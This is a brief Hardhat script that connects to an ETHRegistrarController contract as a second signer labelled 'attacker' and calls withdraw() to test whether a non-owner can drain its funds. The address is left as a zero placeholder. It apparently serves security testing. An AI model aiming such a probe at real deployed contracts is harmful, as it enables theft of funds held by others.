
const { ethers } = require("hardhat");
const fs = require("fs");

async function main() {
  const CONTRACT_ADDRESS = "0x0000000000000000000000000000000000000000"; // replace with deployed contract address
  const abi = JSON.parse(fs.readFileSync("abi/ETHRegistrarController.json", "utf8"));

  const attacker = (await ethers.getSigners())[1];
  const contract = new ethers.Contract(CONTRACT_ADDRESS, abi, attacker);

  try {
    const tx = await contract.withdraw();
    console.log("✅ Potentially vulnerable! TX Hash:", tx.hash);
  } catch (err) {
    console.error("❌ Attack failed. Error:", err.message);
  }
}

main().catch((error) => {
  console.error("❌ Script failed:", error);
});
